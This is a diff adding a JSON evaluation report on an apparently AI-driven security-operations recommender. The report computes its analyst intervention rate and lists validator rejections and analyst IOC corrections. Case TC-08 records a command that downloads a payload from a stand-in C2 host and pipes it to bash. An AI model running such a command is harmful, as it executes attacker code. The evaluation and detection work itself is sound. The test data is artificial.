@@ -1,0 +1,108 @@
+{
+  "kpi": "Intervention Rate",
+  "formula": "cases requiring analyst intervention / evaluated cases × 100",
+  "definition": "an analyst correction was applied because the AI recommendation could not safely proceed (the system had its first 2 attempts; corrections are only IOC confirmations/additions that the alert itself evidences; nothing is corrected silently)",
+  "source": "threat_intel_iocs.created_by <> 'system' (database) cross-checked with the interventions recorded by the harness",
+  "result": {
+    "numerator": 2,
+    "denominator": 9,
+    "pct": 22.22
+  },
+  "dbVsHarnessAgree": true,
+  "cases": [
+    {
+      "tc": "TC-03",
+      "incident_id": "c777dab0-bc6c-4455-b764-edd7f7477a7e",
+      "reason": "Missing IOC / target not evidence-linked (e-mail)",
+      "evidenceCondition": {
+        "expectedIocsMissingBeforeCorrection": [],
+        "validatorRejections": [
+          "TARGET_TYPE_MISMATCH: step 1 (ACT-QUARANTINE-EMAIL): target \"http://vigix-eval-phish.net/o365/verify?id=hr.clerk\" is a url, but ACT-QUARANTINE-EMAIL operates on a email",
+          "TARGET_TYPE_MISMATCH: step 4 (ACT-BLOCK-URL): target \"203.0.113.45\" is a ip, but ACT-BLOCK-URL operates on a url",
+          "TARGET_TYPE_MISMATCH: step 1 (ACT-QUARANTINE-EMAIL): target \"attack-endpoint\" is a host, but ACT-QUARANTINE-EMAIL operates on a email",
+          "INVENTED_TARGET: step 2 (ACT-BLOCK-URL): instruction 2 targets \"http://vigx-eval-phish.net/o365/verify?id=hr.clerk\", which is not an evidence-linked/analyst-added IOC or an affected host",
+          "INVENTED_TARGET: step 3 (ACT-BLOCK-DOMAIN): instruction 4 targets \"vigix-eval-phs.net\", which is not an evidence-linked/analyst-added IOC or an affected host",
+          "TARGET_TYPE_MISMATCH: step 4 (ACT-BLOCK-URL): target \"203.0.113.45\" is a ip, but ACT-BLOCK-URL operates on a url"
+        ]
+      },
+      "analystActions": [
+        {
+          "type": "URL",
+          "value": "http://vigix-eval-phish.net/o365/verify?id=hr.clerk",
+          "by": "eval-soc",
+          "source": "aggregated"
+        },
+        {
+          "type": "DOMAIN",
+          "value": "vigix-eval-phish.net",
+          "by": "eval-soc",
+          "source": "aggregated"
+        },
+        {
+          "type": "IPV4",
+          "value": "203.0.113.45",
+          "by": "eval-soc",
+          "source": "aggregated"
+        },
+        {
+          "type": "EMAIL",
+          "value": "it-support@vigix-eval-phish.net",
+          "by": "eval-soc",
+          "source": "aggregated"
+        }
+      ],
+      "result_after_intervention": {
+        "recommendation": "COMPLIANT",
+        "workflowComplete": true,
+        "verification": "RESOLVED (REAL_WAZUH)"
+      }
+    },
+    {
+      "tc": "TC-08",
+      "incident_id": "c9f0c50d-c234-4b80-b197-ddff813525b6",
+      "reason": "Missing evidence (COMMAND_LINE / process)",
+      "evidenceCondition": {
+        "expectedIocsMissingBeforeCorrection": [
+          "process:/tmp/.cache/kworkerd",
+          "command:curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash"
+        ],
+        "validatorRejections": [
+          "TARGET_TYPE_MISMATCH: step 1 (ACT-KILL-PROCESS): target \"attack-endpoint\" is a host, but ACT-KILL-PROCESS operates on a process",
+          "INSUFFICIENT_EVIDENCE: step 1 (ACT-KILL-PROCESS): required evidence is not recorded for target \"attack-endpoint\": COMMAND_LINE",
+          "TARGET_TYPE_MISMATCH: step 2 (ACT-QUARANTINE-FILE): target \"attack-endpoint\" is a host, but ACT-QUARANTINE-FILE operates on a file",
+          "INSUFFICIENT_EVIDENCE: step 2 (ACT-QUARANTINE-FILE): required evidence is not recorded for target \"attack-endpoint\": FILE_HASH",
+          "TARGET_TYPE_MISMATCH: step 1 (ACT-KILL-PROCESS): target \"attack-endpoint\" is a host, but ACT-KILL-PROCESS operates on a process",
+          "INSUFFICIENT_EVIDENCE: step 1 (ACT-KILL-PROCESS): required evidence is not recorded for target \"attack-endpoint\": COMMAND_LINE"
+        ]
+      },
+      "analystActions": [
+        {
+          "type": "PROCESS_NAME",
+          "value": "/tmp/.cache/kworkerd",
+          "by": "eval-soc",
+          "source": "analyst enrichment (from alert evidence)"
+        },
+        {
+          "type": "COMMAND_LINE",
+          "value": "curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash",
+          "by": "eval-soc",
+          "source": "analyst enrichment (from alert evidence)"
+        }
+      ],
+      "result_after_intervention": {
+        "recommendation": "COMPLIANT",
+        "workflowComplete": true,
+        "verification": "RESOLVED (REAL_WAZUH)"
+      }
+    }
+  ],
+  "casesWithoutIntervention": [
+    "TC-01",
+    "TC-02",
+    "TC-04",
+    "TC-06",
+    "TC-07",
+    "TC-09",
+    "TC-10"
+  ]
+}
